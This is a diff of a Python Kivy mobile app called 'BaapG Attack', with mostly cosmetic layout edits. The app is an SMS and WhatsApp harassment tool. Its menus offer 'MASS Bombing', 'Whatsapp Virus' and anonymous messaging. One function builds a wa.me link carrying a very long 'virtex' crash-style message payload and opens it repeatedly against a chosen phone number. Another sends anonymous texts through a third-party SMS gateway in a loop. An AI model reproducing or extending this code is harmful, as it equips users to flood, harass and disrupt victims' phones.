@@ -1,16 +1,11 @@
-	
-
 
 __version__ = "1.0.0"
-
-
 
 from kivymd.app import *
 from kivymd.uix.label import *
 from kivy.uix.image import *
 from kivy.uix.screenmanager import *
 from kivy.lang import Builder
-from kivy.core.text import LabelBase 
 from kivymd.uix.button import *
 from kivymd.uix.screen import *
 from kivymd.uix.textfield import *
@@ -18,34 +13,27 @@ from kivy.core.audio import *
 from kivymd.uix.list import *
 from kivymd.toast import *
 from kivy.uix.scrollview import *
-import requests
 import webbrowser
-import os
 import os
 import subprocess
 import sys
-import threading
-from pathlib import Path
+import time
 from kivy.clock import Clock
 from functools import partial
-from kivymd.icon_definitions import md_icons
 from kivy.utils import platform
 from kivy.core.window import Window
-import time
 import _thread
 
-
 screen_manager = ScreenManager()
+
 if platform != "android":
 	Window.size = (540,960)
+
 def makeFile(data,name):
 	if os.path.exists(name):
 		return True
-	else:
-		pass
 	with open(name, "wb") as binary_file:
 		binary_file.write(data)
-		binary_file.close()
 	return True
 
 def isint(text):
@@ -54,6 +42,7 @@ def isint(text):
 	except Exception:
 		return False
 	return True
+
 mainScreen = """
 MDScreen:
 	name : "screen"	
@@ -63,20 +52,15 @@ MDScreen:
 		Image:
 			source:"assets/log.jpg"
 			pos_hint : {"center_x":0.5,"center_y":0.10}
-			size_hint_y: 0.45
-			size_hint_x: 0.45
+			size_hint: 0.45, 0.45
 
 		Image :
-			id : gif 
+			id: gif 
 			source : "assets/circle.gif"
 			pos_hint :  {"center_x":0.5,"center_y":0.65}
-
-
-			size_hint_y: 0.59
-			size_hint_x: 0.59
+			size_hint: 0.59, 0.59
 			anim_delay: 0.05
     		allow_stretch: True
-
 
 		Image:
 			source :"assets/logo.png"
@@ -84,11 +68,11 @@ MDScreen:
 			size_hint_y: 0.45
 			size_hint_x: 0.45
 """
+
 perscr = """
 MDScreen:
 	name: "perscreen"
 	MDFloatLayout:
-
 		md_bg_color: 1,1,1,1
 		MDLabel:
 			text : "EULA"	
@@ -114,18 +98,15 @@ MDScreen:
 			on_press:app.permission()
 			halign :"center"
 			pos_hint : {"center_x":0.5,"center_y":0.35}
-				
-				
-
 """
-import time
+
 net ="""
 MDScreen:
-	name : "net"
+	name: "net"
 	MDFloatLayout:
 		md_bg_color : 0,0,0,1
 		MDLabel
-			text : "You are Fine"
+			text : "You are fine"
 			halign : 'center'
 			pos_hint : {'center_y':0.9}
 			theme_text_color : "Custom"
@@ -148,6 +129,7 @@ MDScreen:
 			text_color : 1,1,1,1
 			on_press : app.home()		
 """
+
 netof = """
 MDScreen:
 	name : "netof"
@@ -198,72 +180,61 @@ MDScreen:
 		text : "Anonymous Message"
 		pos_hint : {"center_x":0.5,"center_y":0.65}
 		icon : "message"
-	
-		line_width :2
 		font_name : "assets/Poppins-Regular.ttf"
 		font_size : "20sp"
 		on_press : app.get_number()
-		size_hint_x : 0.8
-		size_hint_y : 0.08
+		size_hint: 0.8, .08
 		line_width :3
 	MDRoundFlatIconButton:
 		text : "      MASS  Bombing      "
 		pos_hint : {"center_x":0.5,"center_y":0.55}
 		icon : "bomb"
 		icon_color : 0,0,0,1
-		line_width :2
 		font_name : "assets/Poppins-Regular.ttf"
 		font_size : "20sp"
 		text_color: 0,0,0,1
 		line_color : 0,0,0,1
 		on_press : app.wp6()
-		size_hint_x : 0.8
-		size_hint_y : 0.08
+		size_hint_x : 0.8, .08
 		line_width :3
 	MDRoundFlatIconButton:
 		text : "    Whatsapp Virus     "
 		pos_hint : {"center_x":0.5,"center_y":0.45}
 		icon : "whatsapp"
 		icon_color : 0,99/255, 76/255,1
-		line_width :2
 		font_name : "assets/Poppins-Regular.ttf"
 		font_size : "20sp"
 		text_color : 0,99/255, 76/255,1
 		line_color :0,99/255, 76/255,1
 		on_press : app.wp()
-		size_hint_x : 0.8
-		size_hint_y : 0.08
+		size_hint: 0.8, .08
 		line_width :3
 	MDRoundFlatIconButton:
 		text :  "Donations"
 		pos_hint : {"center_x":0.5,"center_y":0.30}
 		icon : "alpha-d-circle"
 		icon_color : 1,0,0,1
-		line_width :3
 		font_name : "assets/Poppins-Regular.ttf"
 		font_size : "20sp"
 		text_color : 1,0,0,1
 		line_color :1,0,0,1
 		on_press : app.screen_manager.current = "donating"
-
 	Image:
 		source :"assets/log1.png"
 		pos_hint :  {"center_x":0.5,"center_y":0.10}
-		size_hint_y: 0.45
-		size_hint_x: 0.45
+		size_hint: 0.45, 0.45
 		
 """
+
 wp2 = """
 MDScreen:
 	name : "wp2"
 	MDFloatLayout:
 		md_bg_color : 1,1,1,1
-
 		Image:
 			source : "assets/progress.gif"
 			halign : "center"			
-			size_hint_y: 0.49
-			size_hint_x: 0.49
+			size_hint: 0.49, 0.49
 			anim_delay: 0.05
     		allow_stretch: True
     		pos_hint :  {"center_x":0.5,"center_y":0.65}
@@ -278,6 +249,7 @@ MDScreen:
 			icon: "home"
 			on_press : app.home()  
 """
+
 phno="""
 MDScreen:
 	name:"phnno"
@@ -297,16 +269,16 @@ MDScreen:
 		font_size : '20sp'
 		theme_text_color : 'Hint'
 		pos_hint : {"center_x":0.68,"center_y":0.85}
-
 	MDTextField:
 		id : input
 		hint_text : "Indian Number "
 		mode:"rectangle"
 		halign :"center"
 		pos_hint : {"center_x":0.5,"center_y":0.65}
+        multiline: False
+        input_filter:  'int'
 		max_text_length: 10
-		size_hint_y :0.10
-		size_hint_x : 0.6
+		size_hint: 0.6, .10
 		required: True
 	MDTextField:
 		id : input1
@@ -314,8 +286,7 @@ MDScreen:
 		mode:"rectangle"
 		halign :"center"
 		pos_hint : {"center_x":0.5,"center_y":0.55}
-		size_hint_y :0.10
-		size_hint_x : 0.6
+		size_hint: 0.60, 0.10
 		required: True
 	MDRectangleFlatIconButton:
 		text : " SEND "
@@ -324,6 +295,7 @@ MDScreen:
 		on_press : app.send(input1.text,input.text)
 		
 """
+
 success = """
 MDScreen:
 	name : "success"
@@ -334,9 +306,7 @@ MDScreen:
 		Image:
 			source : "assets/done.gif"
 			halign : "center"			
-			size_hint_y: 0.49
-			size_hint_x: 0.49
-			anim_delay: 0.05
+			size_hint: 0.49, 0.49
     		allow_stretch: True
     		pos_hint :  {"center_x":0.5,"center_y":0.65}
 	MDRectangleFlatIconButton:
@@ -345,6 +315,7 @@ MDScreen:
 		icon: "home"
 		on_press : app.home()  			
 """
+
 wpb = """
 MDScreen:
 	name:"wpbomb"
@@ -372,8 +343,9 @@ MDScreen:
 		halign :"center"
 		pos_hint : {"center_x":0.5,"center_y":0.65}
 		max_text_length: 3
-		size_hint_y :0.10
-		size_hint_x : 0.6
+		size_hint:0.60, 0.10
+        multiline: False
+        input_filter:  'int'
 		required: True
 	MDTextField:
 		id : input1
@@ -381,8 +353,9 @@ MDScreen:
 		mode:"rectangle"
 		halign :"center"
 		pos_hint : {"center_x":0.5,"center_y":0.55}
-		size_hint_y :0.10
-		size_hint_x : 0.6
+		size_hint:0.60, 0.10
+        multiline: False
+        input_filter:  'int'
 		required: True
 		max_text_length :10
 	MDTextField:
@@ -391,16 +364,18 @@ MDScreen:
 		mode:"rectangle"
 		halign :"center"
 		pos_hint : {"center_x":0.5,"center_y":0.45}
-		size_hint_y :0.10
-		size_hint_x : 0.6
+        size_hint: .60, .10
 		required: True
+        multiline: False
+        input_filter:  'int'
 		max_text_length : 2
 	MDRectangleFlatIconButton:
 		text : " SEND "
-		pos_hint : {"center_x":0.5,"center_y":0.35}
 		icon: "send"
+		pos_hint : {"center_x":0.5,"center_y":0.35}
 		on_press : app.wpsend(input.text+input1.text,int(input2.text))
 """
+
 bombin = """
 MDScreen:
 	name:"bombin"
@@ -426,26 +401,29 @@ MDScreen:
 		mode:"rectangle"
 		halign :"center"
 		pos_hint : {"center_x":0.5,"center_y":0.65}
-		size_hint_y :0.10
-		size_hint_x : 0.6
+        size_hint: .60, .10
 		required: True
 		max_text_length :10
+        multiline: False
+        input_filter:  'int'
 	MDTextField:
 		id : input23
 		hint_text : "Number of messages"
 		mode:"rectangle"
 		halign :"center"
 		pos_hint : {"center_x":0.5,"center_y":0.55}
-		size_hint_y :0.10
-		size_hint_x : 0.6
+        size_hint: .60, .10
 		required: True
 		max_text_length : 2
+        multiline: False
+        input_filter:  'int'
 	MDRectangleFlatIconButton:
 		text : " SEND "
-		pos_hint : {"center_x":0.5,"center_y":0.45}
 		icon: "arrow-right-drop-circle"
+		pos_hint : {"center_x":0.5,"center_y":0.45}
 		on_press : app.bomb(int(input23.text),int(input12.text))
 """
+
 counter = """
 MDScreen:
 	name : "counter"
@@ -498,6 +476,7 @@ MDScreen:
     	line_color: 1, 0, 0, 0
     	icon_color : 1,0,0,0
 """
+
 donating ="""
 MDScreen:
 	name :"donating"
@@ -509,8 +488,7 @@ MDScreen:
 	Image:
 		source:"assets/donate.gif"
 		pos_hint :  {"center_x":0.2,"center_y":0.10}
-		size_hint_y: 0.7
-		size_hint_x: 0.7
+        size_hint: .70, .70
 		anim_delay: 0.05
     	allow_stretch: True
 	MDLabel:
@@ -529,8 +507,7 @@ MDScreen:
 	Image:
 		source : "assets/td.png"
 		pos_hint :  {"center_x":0.2,"center_y":0.67}
-		size_hint_y: 0.3
-		size_hint_x: 0.3
+        size_hint: .30, .30
     	allow_stretch: True
 	MDLabel:
 		text : "TDynamos@Linux"
@@ -566,21 +543,23 @@ MDScreen:
 		font_name : "assets/Poppins-Regular.ttf"
 		pos_hint : {"center_x":0.5,"center_y":0.02}
 """
-def test(ok):
+
+def test():
 	screen_manager.current="success"	
+
 def wpbomb(number,times):
 	link = (f"""https://wa.me/{number}/?text=BaapG%20Jai%20Hind%F0%9F%92%A3%20Ghazipur%20Up%20India%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40krish_na_2568%F0%9F%A4%A3%0A%F0%9F%94%A5HAY%20DUDA%20NIKAH%20YUK%20AWOKWOK%20%F0%9F%98%88%0A*https%3A%2F%2Fyoutu.be%2F4S-i078-YYE*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A*VIRTEX%20BUATAN%20MR%20VIRUS%20BUKAN%20KALENG%C2%B2*%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%0A*9999999999*%20*BaapG*%20*9999999999*%0A%0A*8888888888*%20*BaapG*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2VURUS-SPM%F0%9F%92%A3%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*8888888888*%0A*9999999999*%20*BaapG*%20*9999999999*%0A*8888888888*%20*BaapG*%20*
 """)
 	for i in range(1,times):
 		Clock.schedule_once(partial (webbrowser.open,link),i*4)
-	Clock.schedule_once(partial(test),times*4)
+	Clock.schedule_once(test,times*4)
 
 import urllib.parse
 import requests
+
 def send_sms(message,number):
  url1 = f"https://www.customsms.tk/sms.php?num={number}&msg={urllib.parse.quote(message)}"
- a = requests.get(url1)
- return a 
+ return requests.get(url1) 
 
 def check_intr():
 	import requests
@@ -590,6 +569,7 @@ def check_intr():
 		print(str(e))
 		return False
 	return True
+
 def prepend_line(file_name, line):
     dummy_file = file_name + '.bak'
     with open(file_name, 'r') as read_obj, open(dummy_file, 'w') as write_obj:
@@ -627,11 +607,13 @@ class BaapG_AttackApp(MDApp):
 	title = "BaapG Attack"
 	def wp(self):
 		screen_manager.current = "wpbomb"
+        
 	def reload(self):
 		if check_intr() == True:
 			screen_manager.current = "net"
 		else:
 			screen_manager.current = "netof"		
+
 	def build(self):
 		screen_manager.add_widget(Builder.load_string(mainScreen))
 		screen_manager.add_widget(Builder.load_string(perscr))
@@ -647,10 +629,9 @@ class BaapG_AttackApp(MDApp):
 		screen_manager.add_widget(Builder.load_string(donating))
 		screen_manager.current = "screen"
 		return screen_manager
+
 	def home(self):
 		screen_manager.current = "mainv"
-
-
 
 	def on_start(self):
 		from kivy.base import EventLoop
@@ -750,20 +731,19 @@ MDScreen:
 		pos_hint : {"center_x":0.5,"center_y":0.35}
 		icon: "arrow-right-drop-circle"
 		on_press : app.top()"""
+
 		screen_manager.add_widget(Builder.load_string(ui))
-		
 		screen_manager.current = "temp"
-		
+
 	def top(self):
 		screen_manager.current = "counter"
 		screen_manager.get_screen('counter').ids.success.text = str(0)
 		screen_manager.get_screen('counter').ids.fail.text = str(0)
-
 		import _thread
 		_thread.start_new_thread(self.startBomb,())
 	def sound(self,obj):
 		sound = SoundLoader.load('assets/success.wav')
-		if obj is True:
+		if obj:
 			sound.play()
 		else:
 			sound.stop()
@@ -812,6 +792,7 @@ MDScreen:
 				else:
 					print ("Unexpectedly Error")
 					return exit()			
+
 		screen_manager.get_screen('counter').ids.fail.text = str(0)
 		screen_manager.get_screen('counter').ids.but.text_color =  1, 0, 0, 1
 		screen_manager.get_screen('counter').ids.but.line_color= 1, 0, 0, 1
